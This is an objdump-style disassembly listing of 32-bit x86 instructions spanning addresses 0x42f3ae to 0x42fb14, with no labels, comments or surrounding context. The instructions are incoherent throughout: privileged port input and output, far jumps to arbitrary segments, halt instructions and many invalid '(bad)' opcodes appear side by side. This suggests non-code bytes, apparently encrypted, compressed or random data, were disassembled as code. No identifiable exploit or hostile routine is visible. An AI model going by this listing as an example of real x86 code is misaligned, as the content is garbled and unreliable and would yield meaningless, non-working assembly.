  42f3ae:	jle    0x42f330
  42f3b0:	rol    BYTE PTR ds:0x81972172,1
  42f3b6:	and    cl,dl
  42f3b8:	xchg   esp,eax
  42f3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3ba:	pop    ds
  42f3bb:	mov    esi,esi
  42f3bd:	mov    bl,0xb4
  42f3bf:	jmp    0x42f377
  42f3c1:	sub    eax,0x679bd5ee
  42f3c6:	dec    edi
  42f3c7:	sbb    dh,0xf
  42f3ca:	aas    
  42f3cb:	bound  esi,QWORD PTR [edx+0x868746b]
  42f3d1:	cmp    DWORD PTR [ebx-0x7e],eax
  42f3d4:	sub    bl,BYTE PTR [ebx-0x34d32aa9]
  42f3da:	fcmove st,st(6)
  42f3dc:	jmp    0x42f3aa
  42f3de:	dec    DWORD PTR ss:[ecx+0x4d473e83]
  42f3e5:	mov    ds:0x84e33ef1,al
  42f3ea:	xor    eax,0xe9f78946
  42f3ef:	mov    esi,0x570235b0
  42f3f4:	mov    ch,BYTE PTR ds:0x6337f90d
  42f3fa:	loope  0x42f3df
  42f3fc:	call   0x10de259c
  42f401:	xchg   ecx,eax
  42f402:	adc    DWORD PTR [ebp+ecx*4-0x31],0x5b759e75
  42f40a:	pop    ds
  42f40b:	mov    cl,0x72
  42f40d:	mov    al,ds:0xe7560211
  42f412:	xchg   ch,dl
  42f414:	arpl   WORD PTR [esi],bp
  42f416:	ins    DWORD PTR es:[edi],dx
  42f417:	pop    ecx
  42f418:	cmp    al,0xba
  42f41a:	das    
  42f41b:	inc    sp
  42f41d:	ja     0x42f43e
  42f41f:	mov    bl,0xef
  42f421:	add    al,0xbe
  42f423:	xchg   ebx,eax
  42f424:	in     al,0x63
  42f426:	pop    es
  42f427:	aam    0x99
  42f429:	push   es
  42f42a:	dec    esi
  42f42b:	jne    0x42f3e1
  42f42d:	cmp    al,0x27
  42f42f:	push   0xffffff88
  42f431:	out    dx,eax
  42f432:	xor    al,0x6
  42f434:	inc    esi
  42f435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f436:	clc    
  42f437:	faddp  st(4),st
  42f439:	add    eax,0xca4e39ea
  42f43e:	out    dx,eax
  42f43f:	cmp    DWORD PTR [ecx+0x427d7a75],0xa
  42f446:	dec    ebp
  42f447:	addr16 pushf 
  42f449:	and    al,0x15
  42f44b:	xchg   edi,eax
  42f44c:	inc    ecx
  42f44d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f44e:	hlt    
  42f44f:	outs   dx,DWORD PTR ds:[esi]
  42f450:	scas   al,BYTE PTR es:[edi]
  42f451:	add    bh,BYTE PTR [esi]
  42f453:	push   es
  42f454:	in     al,0x55
  42f456:	inc    ecx
  42f457:	pop    esi
  42f458:	sub    DWORD PTR [ecx+0x37ec999],0x16
  42f45f:	aad    0x3f
  42f461:	in     al,dx
  42f462:	cld    
  42f463:	or     BYTE PTR cs:[eax],al
  42f466:	hlt    
  42f467:	fwait
  42f468:	inc    edx
  42f469:	stos   DWORD PTR es:[edi],eax
  42f46a:	mov    bh,0xec
  42f46c:	dec    ebx
  42f46d:	ret    
  42f46e:	enter  0x4a18,0xda
  42f472:	(bad)  
  42f473:	mov    esi,0xdb38a330
  42f478:	aad    0x2
  42f47a:	sub    BYTE PTR [edi-0xe55c510],bh
  42f480:	enter  0x591f,0x39
  42f484:	daa    
  42f485:	lahf   
  42f486:	pop    ds
  42f487:	sbb    cl,dl
  42f489:	arpl   WORD PTR [edi+0x6b8f76e4],sp
  42f48f:	cmp    dl,BYTE PTR [esi+ebx*1+0x39c9989c]
  42f496:	out    0x54,al
  42f498:	fwait
  42f499:	pop    esi
  42f49a:	gs pop ebp
  42f49c:	arpl   si,bx
  42f49e:	cmp    al,0x32
  42f4a0:	inc    eax
  42f4a1:	push   edx
  42f4a2:	jns    0x42f43f
  42f4a4:	aad    0x2
  42f4a6:	adc    al,BYTE PTR [ecx+0x50]
  42f4a9:	add    eax,0x899d82e7
  42f4ae:	pop    ds
  42f4af:	cmp    eax,0x770c7c8c
  42f4b4:	xor    BYTE PTR [ebx+ecx*8],cl
  42f4b7:	aam    0xe2
  42f4b9:	iret   
  42f4ba:	jb     0x42f483
  42f4bc:	pop    ebx
  42f4bd:	xor    ebp,esi
  42f4bf:	xchg   ecx,eax
  42f4c0:	mov    BYTE PTR [edi+0x55fe668f],bl
  42f4c6:	pop    edi
  42f4c7:	sar    DWORD PTR [ecx+0x3],cl
  42f4ca:	inc    esp
  42f4cb:	inc    edi
  42f4cc:	repz jmp 0x42f4bd
  42f4cf:	dec    esp
  42f4d0:	sub    al,0x7
  42f4d2:	pusha  
  42f4d3:	or     eax,0xfda45f4f
  42f4d8:	clc    
  42f4d9:	out    dx,al
  42f4da:	push   ebx
  42f4db:	shl    DWORD PTR [esi+0x652cef2c],cl
  42f4e1:	jmp    0x82981366
  42f4e6:	outs   dx,BYTE PTR ds:[esi]
  42f4e7:	(bad)  ds:0x8838b819
  42f4ed:	nop
  42f4ee:	sub    dh,BYTE PTR [edi]
  42f4f0:	outs   dx,DWORD PTR ds:[esi]
  42f4f1:	mov    bl,ah
  42f4f3:	test   BYTE PTR [esi-0x4fdcfe0f],al
  42f4f9:	add    ah,bl
  42f4fb:	mov    edi,ecx
  42f4fd:	jp     0x42f55b
  42f4ff:	and    DWORD PTR [ebx-0x2d],ebx
  42f502:	pop    ds
  42f503:	imul   edx,DWORD PTR [edi-0x41397da8],0x9c961402
  42f50d:	jecxz  0x42f56b
  42f50f:	jb     0x42f492
  42f511:	jge    0x42f531
  42f513:	test   DWORD PTR [esi],ebp
  42f515:	cwde   
  42f516:	add    eax,0x2bbed59b
  42f51b:	inc    ebx
  42f51c:	mov    ebx,0x89d7959f
  42f521:	jmp    0xa82f:0x284d28ee
  42f528:	mov    DWORD PTR ds:0x9081a2d0,edx
  42f52e:	in     al,0xb1
  42f530:	fwait
  42f531:	add    bl,BYTE PTR [edx+ecx*1-0x58]
  42f535:	pusha  
  42f536:	pop    ss
  42f537:	adc    BYTE PTR [esi-0x7a],cl
  42f53a:	add    esi,edi
  42f53c:	mov    ch,0xab
  42f53e:	out    0x19,eax
  42f540:	or     DWORD PTR [edx-0x38eb728b],esi
  42f546:	enter  0xe6d5,0xbf
  42f54a:	pop    esi
  42f54b:	push   edi
  42f54c:	sub    al,0x5a
  42f54e:	mov    ebp,0x1f994db4
  42f553:	jmp    0x42f5b2
  42f555:	stos   DWORD PTR es:[edi],eax
  42f556:	mov    eax,ds:0xe832199
  42f55b:	mov    cl,BYTE PTR [eax-0x4e0149a0]
  42f561:	jecxz  0x42f5e0
  42f563:	pop    ecx
  42f564:	sbb    ah,ch
  42f566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f567:	push   ebp
  42f568:	outs   dx,BYTE PTR ds:[esi]
  42f569:	mov    esi,0x14d23317
  42f56e:	into   
  42f56f:	gs cld 
  42f571:	into   
  42f572:	dec    ebx
  42f573:	adc    al,0x78
  42f575:	je     0x42f54c
  42f577:	pop    esi
  42f578:	mov    BYTE PTR [edi],dl
  42f57a:	mov    ah,0xb1
  42f57c:	test   BYTE PTR [edx+0x7c],ah
  42f57f:	pusha  
  42f580:	test   eax,0x8d1b0013
  42f585:	push   es
  42f586:	popa   
  42f587:	lea    esi,[edi-0x21e96fba]
  42f58d:	ret    0xa4e6
  42f590:	xchg   esi,eax
  42f591:	(bad)  
  42f592:	std    
  42f593:	outs   dx,DWORD PTR ds:[esi]
  42f594:	ja     0x42f598
  42f596:	jns    0x42f521
  42f598:	jo     0x42f522
  42f59a:	sbb    dl,ah
  42f59c:	and    eax,0x7fb3edea
  42f5a1:	in     eax,0xe2
  42f5a3:	and    esi,DWORD PTR [eax+0x8094281]
  42f5a9:	xor    dl,0x7f
  42f5ac:	nop
  42f5ad:	mov    BYTE PTR [ebp-0x76d3792b],dh
  42f5b3:	iret   
  42f5b4:	mov    eax,ds:0x8841cfb8
  42f5b9:	or     eax,0x87151ff3
  42f5be:	or     esi,DWORD PTR [edi+0x2a]
  42f5c1:	add    bh,BYTE PTR [ebx+edx*2-0x7edb8563]
  42f5c8:	mov    bh,0xd1
  42f5ca:	pop    ds
  42f5cb:	or     DWORD PTR [esi-0x5942de5b],edx
  42f5d1:	sbb    al,0x0
  42f5d3:	aam    0x67
  42f5d5:	lahf   
  42f5d6:	inc    ebx
  42f5d7:	sbb    eax,0x89e35f45
  42f5dd:	or     eax,0x35f166d3
  42f5e2:	(bad)  
  42f5e3:	push   ebx
  42f5e4:	push   esp
  42f5e5:	repz mov esp,0x9cd2a2d5
  42f5eb:	cld    
  42f5ec:	inc    BYTE PTR [eax-0x18771ca4]
  42f5f2:	adc    al,0xbd
  42f5f4:	(bad)  
  42f5f5:	leave  
  42f5f6:	sbb    eax,0x525d91a7
  42f5fb:	idiv   ch
  42f5fd:	dec    ecx
  42f5fe:	mov    dh,0x55
  42f600:	pop    ss
  42f601:	mov    ebx,0x4fe864dc
  42f606:	pusha  
  42f607:	push   edi
  42f608:	mov    edx,0x24a88764
  42f60d:	cmp    BYTE PTR [ecx+0x597417b],ah
  42f613:	repz xchg esi,eax
  42f615:	add    ah,al
  42f617:	pop    ebp
  42f618:	arpl   WORD PTR [esi-0x2d],si
  42f61b:	arpl   WORD PTR [edi],sp
  42f61d:	sbb    ch,0x7b
  42f620:	enter  0x4b4e,0xa1
  42f624:	pop    esp
  42f625:	rep stos DWORD PTR es:[edi],eax
  42f627:	fwait
  42f628:	jl     0x42f62d
  42f62a:	mov    bh,al
  42f62c:	push   eax
  42f62d:	and    ah,ah
  42f62f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f630:	xchg   esp,eax
  42f631:	pop    ss
  42f632:	cmp    al,0x41
  42f634:	sbb    al,BYTE PTR [ebx-0x6a]
  42f637:	xchg   edi,eax
  42f638:	dec    cx
  42f63a:	xlat   BYTE PTR ds:[ebx]
  42f63c:	adc    DWORD PTR [ebx+0x31],edx
  42f63f:	pop    esi
  42f640:	dec    esp
  42f641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f642:	data16 cld 
  42f644:	mov    ebp,esp
  42f646:	(bad)  
  42f647:	adc    al,BYTE PTR [ecx+0x35]
  42f64a:	or     BYTE PTR [eax],bh
  42f64c:	fwait
  42f64d:	add    ah,al
  42f64f:	fiadd  WORD PTR [eax]
  42f651:	aad    0xdb
  42f653:	out    0xca,eax
  42f655:	dec    ecx
  42f656:	cmp    al,0xdf
  42f658:	lea    ecx,[edi-0xdb5aa0]
  42f65e:	(bad)  
  42f65f:	mov    ebp,0xd58ad72e
  42f664:	and    DWORD PTR [ecx-0x42],ecx
  42f667:	jmp    0xfd8b:0x3464b4e
  42f66e:	or     edi,DWORD PTR [ebp-0x21]
  42f671:	cli    
  42f672:	push   ss
  42f673:	mov    bl,0x78
  42f675:	pop    ss
  42f676:	dec    eax
  42f677:	cdq    
  42f678:	mov    edi,ebx
  42f67a:	stos   BYTE PTR es:[edi],al
  42f67b:	fmul   DWORD PTR [ecx-0x50e96aa3]
  42f681:	dec    ecx
  42f682:	sub    BYTE PTR ds:0xded5d989,bh
  42f688:	mov    edi,0x946a992e
  42f68d:	or     edi,ebp
  42f68f:	aam    0x90
  42f691:	cdq    
  42f692:	cs mov edx,0x63ce5659
  42f698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f699:	(bad)  
  42f69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f69b:	dec    esp
  42f69c:	mov    DWORD PTR [ebx-0xf],esp
  42f69f:	cmp    ah,dh
  42f6a1:	fcmovnb st,st(4)
  42f6a3:	xlat   BYTE PTR ds:[ebx]
  42f6a4:	xchg   ebx,eax
  42f6a5:	xchg   edx,eax
  42f6a6:	outs   dx,BYTE PTR ds:[esi]
  42f6a7:	fistp  DWORD PTR [edi]
  42f6a9:	jns    0x42f644
  42f6ab:	cmc    
  42f6ac:	cmp    cl,al
  42f6ae:	pusha  
  42f6af:	sub    eax,0xa24884ca
  42f6b4:	or     bl,BYTE PTR [ebx+eiz*4-0x2b]
  42f6b8:	(bad)  [ecx+0x67]
  42f6bb:	mov    fs,WORD PTR [edx]
  42f6bd:	push   0x9db1efda
  42f6c2:	dec    esp
  42f6c3:	sbb    eax,0xe6f9a389
  42f6c8:	adc    BYTE PTR [eax+ebx*2],0xd4
  42f6cc:	pop    edx
  42f6cd:	mov    bl,0xe3
  42f6cf:	or     eax,0xef887c56
  42f6d4:	mov    BYTE PTR [edi-0x7b],ah
  42f6d7:	push   ds
  42f6d8:	icebp  
  42f6d9:	add    BYTE PTR [edi-0x63],bh
  42f6dc:	fs pop edx
  42f6de:	test   al,0xe9
  42f6e0:	hlt    
  42f6e1:	add    eax,0x6b1e425c
  42f6e6:	xlat   BYTE PTR ds:[ebx]
  42f6e7:	loop   0x42f6e6
  42f6e9:	sbb    edi,esp
  42f6eb:	mov    al,al
  42f6ed:	xchg   ebp,eax
  42f6ee:	jl     0x42f6f5
  42f6f0:	xchg   edi,eax
  42f6f1:	add    bl,0x8e
  42f6f4:	ins    BYTE PTR es:[edi],dx
  42f6f5:	inc    eax
  42f6f6:	adc    esp,0x1a2f4cb2
  42f6fc:	inc    esi
  42f6fd:	cmp    eax,0x6b881877
  42f702:	adc    eax,0xc2e8ec38
  42f707:	jae    0x42f69f
  42f709:	add    ch,ah
  42f70b:	mov    al,ds:0x1a624d31
  42f710:	mov    eax,0x88891225
  42f715:	out    0xc7,eax
  42f717:	mov    edx,0x790b85a5
  42f71c:	sbb    DWORD PTR [edx],eax
  42f71e:	pop    esi
  42f71f:	dec    edx
  42f720:	retf   
  42f721:	mov    dh,0x4b
  42f723:	test   BYTE PTR [ebp+0x7ef16083],bh
  42f729:	pop    esp
  42f72a:	push   0xfffffff7
  42f72c:	and    dh,BYTE PTR [edi]
  42f72e:	or     dl,bh
  42f730:	adc    DWORD PTR [esi],edi
  42f732:	sbb    eax,0xfc62a371
  42f737:	mov    ebx,0x7b090d88
  42f73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f73d:	sbb    edx,DWORD PTR [eax]
  42f73f:	leave  
  42f740:	hlt    
  42f741:	add    eax,0x4ad1a0b4
  42f746:	and    esp,DWORD PTR [edi+0x1b1fdc12]
  42f74c:	(bad)  
  42f74d:	lahf   
  42f74e:	mov    dh,0x89
  42f750:	ret    0x7431
  42f753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f754:	pop    edi
  42f755:	jmp    0x3c19:0xe7892148
  42f75c:	sub    al,0x24
  42f75e:	pop    ds
  42f75f:	sbb    DWORD PTR [eax+0x3c],ebp
  42f762:	das    
  42f763:	jns    0x42f7d5
  42f765:	nop
  42f766:	nop
  42f767:	stos   DWORD PTR es:[edi],eax
  42f768:	icebp  
  42f769:	inc    edx
  42f76a:	cmp    BYTE PTR [ebx+0x3b],0xfa
  42f76e:	clc    
  42f76f:	aam    0x13
  42f771:	pop    edi
  42f772:	cmp    BYTE PTR [esi+0x7e278188],0xfd
  42f779:	out    0xf9,al
  42f77b:	jg     0x42f792
  42f77d:	add    bl,BYTE PTR [eax+ebp*4]
  42f780:	inc    edi
  42f781:	retf   0x6334
  42f784:	mov    WORD PTR [eax-0x806a1fb],?
  42f78a:	adc    ch,0x77
  42f78d:	add    ebp,esi
  42f78f:	ins    DWORD PTR es:[edi],dx
  42f790:	add    BYTE PTR [edx],ah
  42f792:	(bad)  
  42f793:	aam    0xb7
  42f795:	dec    esp
  42f796:	in     eax,0x63
  42f798:	les    esp,FWORD PTR [ecx+0xb]
  42f79b:	xchg   esp,eax
  42f79c:	mov    es,ecx
  42f79e:	xor    al,0xb0
  42f7a0:	cs sub al,0x84
  42f7a3:	arpl   WORD PTR [ebp+ebx*2-0x65],sp
  42f7a7:	push   esp
  42f7a8:	pop    ds
  42f7a9:	sbb    al,0xf7
  42f7ab:	ret    
  42f7ac:	clc    
  42f7ad:	add    dl,ah
  42f7af:	jp     0x42f749
  42f7b1:	rcr    edi,cl
  42f7b3:	ja     0x42f7da
  42f7b5:	aam    0x61
  42f7b7:	inc    ebp
  42f7b8:	cs inc edi
  42f7ba:	ja     0x42f7e4
  42f7bc:	outs   dx,BYTE PTR ds:[esi]
  42f7bd:	mov    ch,0x20
  42f7bf:	mov    ebp,0xe361b308
  42f7c4:	mov    DWORD PTR [ebx+0xe],edx
  42f7c7:	shl    BYTE PTR [ebp-0x494bdcd5],cl
  42f7cd:	loope  0x42f796
  42f7cf:	test   BYTE PTR [edx+eax*8],ch
  42f7d2:	ins    BYTE PTR es:[edi],dx
  42f7d3:	mov    cl,0xa4
  42f7d5:	cld    
  42f7d6:	adc    esp,0x2f
  42f7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f7da:	jb     0x42f793
  42f7dc:	sahf   
  42f7dd:	aaa    
  42f7de:	ret    0x899c
  42f7e1:	mov    edx,DWORD PTR [esi-0x3f]
  42f7e4:	outs   dx,WORD PTR ds:[esi]
  42f7e6:	mov    DWORD PTR [eax+0x215e73d7],ebx
  42f7ec:	add    al,BYTE PTR fs:[esi-0x7f]
  42f7f0:	iret   
  42f7f1:	or     BYTE PTR [esi-0x13],dh
  42f7f4:	fisttp DWORD PTR [edi+0x1e]
  42f7f7:	int    0x8d
  42f7f9:	jnp    0x42f877
  42f7fb:	(bad)  
  42f7fc:	adc    ah,BYTE PTR [eax+ebp*8+0x411e5cd5]
  42f803:	xor    edi,eax
  42f805:	add    ah,BYTE PTR [ecx+0x11]
  42f808:	call   DWORD PTR [ebp+0x1713c46]
  42f80e:	cwde   
  42f80f:	cdq    
  42f810:	lea    bp,[ecx+ebp*2]
  42f814:	mov    BYTE PTR [esi],ch
  42f816:	mov    edx,0xd89ff11d
  42f81b:	stc    
  42f81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f81d:	add    esi,DWORD PTR [eax+0x31]
  42f820:	mov    BYTE PTR [ebx+0x5e],bh
  42f823:	cmp    DWORD PTR [eax+esi*2+0x1494156a],ecx
  42f82a:	ins    BYTE PTR es:[edi],dx
  42f82b:	pop    esp
  42f82c:	adc    ah,BYTE PTR [eax]
  42f82e:	lods   eax,DWORD PTR ds:[esi]
  42f82f:	cs loop 0x42f837
  42f832:	inc    ebx
  42f833:	lods   eax,DWORD PTR ds:[esi]
  42f834:	fsub   QWORD PTR [edi-0x7a]
  42f837:	add    eax,0xc91f8ea4
  42f83c:	cmp    al,0x26
  42f83e:	sbb    DWORD PTR ds:0xda400374,0x3d
  42f845:	pop    ecx
  42f846:	mov    ebp,0x1e1ada15
  42f84b:	aaa    
  42f84c:	jmp    0x42f80f
  42f84e:	retf   
  42f84f:	in     eax,dx
  42f850:	sbb    dh,dl
  42f852:	or     edx,edi
  42f854:	mov    al,ds:0xab95108f
  42f859:	loop   0x42f876
  42f85b:	add    ecx,DWORD PTR [edx+0x7d03aa9f]
  42f861:	push   eax
  42f862:	adc    cl,0x8
  42f865:	int    0x59
  42f867:	aam    0xed
  42f869:	sar    BYTE PTR [edi],0x45
  42f86c:	rcr    BYTE PTR [eax-0x16778c45],0x90
  42f873:	push   esi
  42f874:	and    BYTE PTR [esi-0x7f],dl
  42f877:	pushf  
  42f878:	jp     0x42f87d
  42f87a:	pusha  
  42f87b:	or     dl,ah
  42f87d:	xchg   BYTE PTR [ebp-0x62b67512],bl
  42f883:	mov    ebp,ebx
  42f885:	add    dl,BYTE PTR [esi]
  42f887:	mov    ?,WORD PTR [esi]
  42f889:	hlt    
  42f88a:	cmc    
  42f88b:	inc    edx
  42f88c:	and    al,0x14
  42f88e:	add    al,BYTE PTR ds:0x35ff8fa1
  42f894:	mov    ah,0x7c
  42f896:	cmp    al,0xb9
  42f898:	mov    bh,bl
  42f89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f89b:	jae    0x42f820
  42f89d:	push   cs
  42f89e:	das    
  42f89f:	mov    edx,0xd57ba110
  42f8a4:	fcomp  st(2)
  42f8a6:	pop    esp
  42f8a7:	test   DWORD PTR [ebx+0x17],ebx
  42f8aa:	adc    eax,0x5a634c0f
  42f8af:	lods   eax,DWORD PTR ds:[esi]
  42f8b0:	je     0x42f90a
  42f8b2:	cld    
  42f8b3:	fwait
  42f8b4:	pop    edi
  42f8b5:	sub    DWORD PTR [edi-0x6f],0xffffffda
  42f8b9:	arpl   WORD PTR [esi-0x65945e2b],bp
  42f8bf:	sub    ah,ah
  42f8c1:	adc    bl,BYTE PTR [ecx+0x12]
  42f8c4:	mov    ebp,ebp
  42f8c6:	dec    esi
  42f8c7:	or     al,BYTE PTR [ecx+0xd]
  42f8ca:	les    ebp,FWORD PTR [edx]
  42f8cc:	(bad)  
  42f8cd:	add    eax,0xdd83661c
  42f8d2:	imul   edx,DWORD PTR [edx],0xffffff97
  42f8d5:	popf   
  42f8d6:	mov    edi,0x1e2d7470
  42f8db:	fwait
  42f8dc:	imul   ecx,DWORD PTR [ecx-0x4197a4d5],0x5f3ed4cc
  42f8e6:	cmp    esp,DWORD PTR [edx-0x4e]
  42f8e9:	ficom  WORD PTR [eax+0x82db305]
  42f8ef:	push   eax
  42f8f0:	or     DWORD PTR [ebp-0x57658d92],esp
  42f8f6:	in     al,dx
  42f8f7:	aam    0x1a
  42f8f9:	out    dx,al
  42f8fa:	daa    
  42f8fb:	or     cl,BYTE PTR [edi-0x35]
  42f8fe:	ret    0xf35b
  42f901:	ins    DWORD PTR es:[edi],dx
  42f902:	mov    bl,0xa7
  42f904:	dec    ebx
  42f905:	out    dx,al
  42f906:	sub    dl,ah
  42f908:	add    eax,0x8f426001
  42f90d:	add    BYTE PTR [eax+0x67],al
  42f910:	push   ebx
  42f911:	mov    DWORD PTR [edx+0x49],esi
  42f914:	xor    BYTE PTR [ebx+0x4188988c],al
  42f91a:	scas   al,BYTE PTR es:[edi]
  42f91b:	sar    esp,cl
  42f91d:	loopne 0x42f96c
  42f91f:	jns    0x42f958
  42f921:	add    DWORD PTR [esi+0x19],esp
  42f924:	jecxz  0x42f904
  42f926:	fwait
  42f927:	out    0xcb,al
  42f929:	mov    dl,0xa8
  42f92b:	mov    edi,0x315fefb0
  42f930:	or     BYTE PTR [ecx+0x2b],ch
  42f933:	jecxz  0x42f957
  42f935:	mov    ch,0x92
  42f937:	aam    0xd7
  42f939:	enter  0x9964,0x6d
  42f93d:	rcl    BYTE PTR fs:[eax+ecx*4+0xd],0xf6
  42f943:	sub    al,0x9a
  42f945:	inc    ebx
  42f946:	daa    
  42f947:	iret   
  42f948:	mov    WORD PTR [edx],ds
  42f94a:	cld    
  42f94b:	mov    ch,0x6c
  42f94d:	mov    bh,0xae
  42f94f:	push   esi
  42f950:	in     eax,0x9d
  42f952:	push   ecx
  42f953:	adc    eax,0x1f60a6fc
  42f958:	xlat   BYTE PTR ds:[ebx]
  42f959:	aaa    
  42f95a:	stos   DWORD PTR es:[edi],eax
  42f95b:	and    ebx,DWORD PTR [edx*4+0x5faaa81]
  42f962:	xchg   ecx,eax
  42f963:	enter  0x82e9,0x4a
  42f967:	xchg   edx,eax
  42f968:	mov    BYTE PTR [ebx],0x1e
  42f96b:	out    0x5c,eax
  42f96d:	jecxz  0x42f9e4
  42f96f:	repnz mov ds:0xb8d451eb,al
  42f975:	mov    ch,0x91
  42f977:	scas   eax,DWORD PTR es:[edi]
  42f978:	sar    BYTE PTR [ecx],0xb1
  42f97b:	pop    ss
  42f97c:	dec    eax
  42f97d:	lea    esp,[ecx+0x25]
  42f980:	dec    edi
  42f981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f982:	or     DWORD PTR [ebp+eax*2+0x3f54d617],ebx
  42f989:	and    al,0x40
  42f98b:	xchg   edx,eax
  42f98c:	add    ch,BYTE PTR [edi+ebx*1+0x55]
  42f990:	pop    eax
  42f991:	inc    edx
  42f992:	cmp    DWORD PTR [edi+0x5f490f88],eax
  42f998:	or     esi,DWORD PTR [ebp-0x24]
  42f99b:	pop    esp
  42f99c:	cld    
  42f99d:	add    cl,BYTE PTR [edx]
  42f99f:	and    DWORD PTR [edi-0x15],ebx
  42f9a2:	mov    ecx,ds
  42f9a4:	dec    ebx
  42f9a5:	fidivr DWORD PTR [edi-0x34]
  42f9a8:	mov    BYTE PTR [edi+0x2e59b30f],cl
  42f9ae:	mov    esi,0xc40342a8
  42f9b3:	xchg   ebx,eax
  42f9b4:	cdq    
  42f9b5:	push   es
  42f9b6:	ss jmp 0xb621595
  42f9bc:	cmp    eax,0xdcbc4e1f
  42f9c1:	test   eax,0xca70d4a4
  42f9c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9c7:	mov    bl,0xce
  42f9c9:	dec    esi
  42f9ca:	(bad)  
  42f9cb:	adc    DWORD PTR [ecx-0x77c8628f],ecx
  42f9d1:	loop   0x42f9ba
  42f9d3:	dec    esi
  42f9d4:	sub    ah,BYTE PTR ds:0x5b78c52a
  42f9da:	pop    ds
  42f9db:	xor    dl,BYTE PTR [ecx]
  42f9dd:	sub    dh,BYTE PTR [esi]
  42f9df:	stc    
  42f9e0:	mov    ebp,DWORD PTR [ebp-0x48]
  42f9e3:	xor    DWORD PTR [ebx],eax
  42f9e5:	xchg   ebp,eax
  42f9e6:	das    
  42f9e7:	fimul  WORD PTR [esi]
  42f9e9:	jecxz  0x42f9c5
  42f9eb:	fdivrp st(4),st
  42f9ed:	add    eax,0x51da7c12
  42f9f2:	js     0x42f9be
  42f9f4:	mov    ds:0x78817a01,al
  42f9f9:	push   ebx
  42f9fa:	addr16 and esi,ebx
  42f9fd:	jl     0x42fa1e
  42f9ff:	sub    edx,DWORD PTR [ebx]
  42fa01:	pop    ebx
  42fa02:	ins    DWORD PTR es:[edi],dx
  42fa03:	add    dl,0x5
  42fa06:	xor    al,BYTE PTR [edx-0x5f]
  42fa09:	dec    eax
  42fa0a:	or     al,0x4d
  42fa0c:	popf   
  42fa0d:	sbb    bh,BYTE PTR [ebp+eiz*8+0x35]
  42fa11:	xor    BYTE PTR [ecx-0x151d0e6b],dh
  42fa17:	mov    eax,0xa7080232
  42fa1c:	fcomp  st(7)
  42fa1e:	pop    es
  42fa1f:	lock inc esi
  42fa21:	shr    DWORD PTR ds:0x3e3928be,0xe6
  42fa28:	test   BYTE PTR [edi-0x7f792ba3],al
  42fa2e:	call   DWORD PTR [esi]
  42fa30:	(bad)  
  42fa31:	mov    al,ds:0x4589a3db
  42fa36:	(bad)  
  42fa37:	or     eax,0x46fcad56
  42fa3c:	int3   
  42fa3d:	or     al,BYTE PTR [eax-0x7a67f147]
  42fa43:	dec    ecx
  42fa44:	mov    bh,BYTE PTR [eax]
  42fa46:	aas    
  42fa47:	mov    al,ds:0x14d0c012
  42fa4c:	retf   0x600c
  42fa4f:	dec    edi
  42fa50:	and    BYTE PTR [edi],dh
  42fa52:	xchg   esi,eax
  42fa53:	enter  0x2768,0x7e
  42fa57:	aad    0x5c
  42fa59:	cmp    DWORD PTR ss:[ebx+0x35],0x891daf63
  42fa61:	ror    DWORD PTR [eax+0x1c35210e],cl
  42fa67:	jb     0x42fa71
  42fa69:	add    esi,DWORD PTR [esi]
  42fa6b:	fimul  WORD PTR [ebx]
  42fa6d:	das    
  42fa6e:	pop    ecx
  42fa6f:	and    esp,DWORD PTR [edi]
  42fa71:	fisub  WORD PTR [eax-0x67]
  42fa74:	hlt    
  42fa75:	mov    dh,0x4a
  42fa77:	das    
  42fa78:	sbb    dh,ah
  42fa7a:	push   0x4b7843d5
  42fa7f:	ds int 0xf9
  42fa82:	addr16 cld 
  42fa84:	mov    esi,DWORD PTR [ecx-0x429de388]
  42fa8a:	jbe    0x42fa5d
  42fa8c:	sbb    DWORD PTR [ebp-0x13],ecx
  42fa8f:	sbb    eax,0xcf6082db
  42fa94:	daa    
  42fa95:	push   0x76
  42fa97:	jg     0x42faf7
  42fa99:	scas   al,BYTE PTR es:[edi]
  42fa9a:	pop    ds
  42fa9b:	popf   
  42fa9c:	adc    edx,DWORD PTR [edx]
  42fa9e:	cld    
  42fa9f:	call   0x344b:0x55045bf5
  42faa6:	pop    ebx
  42faa7:	icebp  
  42faa8:	push   ss
  42faa9:	and    BYTE PTR [edx-0x28e5c996],0x7b
  42fab0:	mov    DWORD PTR [ebx],eax
  42fab2:	adc    BYTE PTR [ebp+0x1565d80c],bh
  42fab8:	shl    BYTE PTR fs:[edx-0x2b],cl
  42fabc:	sub    DWORD PTR [edi],edx
  42fabe:	pop    edx
  42fabf:	out    0x82,eax
  42fac1:	std    
  42fac2:	jge    0x3653de57
  42fac8:	shl    BYTE PTR [edi-0x20530bb4],1
  42face:	test   ch,dl
  42fad0:	inc    edi
  42fad1:	loopne 0x42fa9a
  42fad3:	add    BYTE PTR [eax+0x29],ah
  42fad6:	fstp   TBYTE PTR [esi+0x7962ee6f]
  42fadc:	inc    edx
  42fadd:	pop    edx
  42fade:	hlt    
  42fadf:	std    
  42fae0:	loop   0x42fae3
  42fae2:	iret   
  42fae3:	and    al,0x1e
  42fae5:	add    esp,DWORD PTR [ecx+ebx*8]
  42fae8:	enter  0xaceb,0x2f
  42faec:	aam    0x7c
  42faee:	pusha  
  42faef:	out    dx,eax
  42faf0:	jmp    0xbe5e:0x6cf47790
  42faf7:	iret   
  42faf8:	mov    edi,0x94db6e03
  42fafd:	imul   edx,DWORD PTR [ebx+0x7c63625b],0x2a
  42fb04:	mov    BYTE PTR [ebp-0x30],cl
  42fb07:	add    edi,DWORD PTR [ebp+0x6ef7fc73]
  42fb0d:	adc    eax,0x2901bbec
  42fb12:	test   al,0x54
  42fb14:	jns    0x42fb05
